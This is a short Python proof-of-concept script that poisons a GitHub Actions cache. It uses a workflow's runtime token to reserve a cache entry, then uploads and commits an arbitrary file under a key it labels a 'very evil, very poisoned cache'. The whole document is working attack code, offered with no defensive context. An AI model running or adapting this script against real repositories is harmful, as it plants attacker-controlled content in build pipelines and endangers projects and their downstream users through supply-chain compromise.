import requests
import json
import sys
import os

# Replace AUTH_TOKEN and CACHE_URL from workflow.
AUTH_TOKEN = "eyJ...."
CACHE_URL = 'https://acghubeus2.actions.githubusercontent.com/..../_apis/artifactcache/caches'

headers = {
    'accept': 'application/json;api-version=6.0-preview.1',
    'content-type': 'application/json',
    'user-agent': 'actions/cache',
    'Authorization': f'Bearer {AUTH_TOKEN}',
}

data = {
  "key": "my very evil, very poisoned cache containing bad things. 😈",
  "version": "any value can go here",
  # This isn't checked, just need a valid number.
  "cacheSize": 1
}

response = requests.post(CACHE_URL, headers=headers, json=data)
if response.status_code == 201:

    cache_id = response.json()['cacheId']
    file_path = sys.argv[1]
    with open(file_path, 'rb') as f:
        file_data = f.read()

    patch_headers = {
        "Content-Type": "application/octet-stream",
        "Content-Range": f"bytes 0-{len(file_data) -1}/*"

    }
    patch_headers.update(headers)
    patch_response = requests.patch(CACHE_URL + '/' + str(cache_id), headers=patch_headers, data=file_data)
    if patch_response.status_code == 204:
        file_size = os.path.getsize(file_path)
        size_data = {
            "size": file_size
        }
        post_response = requests.post(CACHE_URL + '/' + str(cache_id), headers=headers, json=size_data)
        print(post_response.status_code)
        print(post_response.text)
    else:
        print(patch_response.status_code)
        print(patch_response.text)
else:
    print(response.status_code)
    print(response.text)
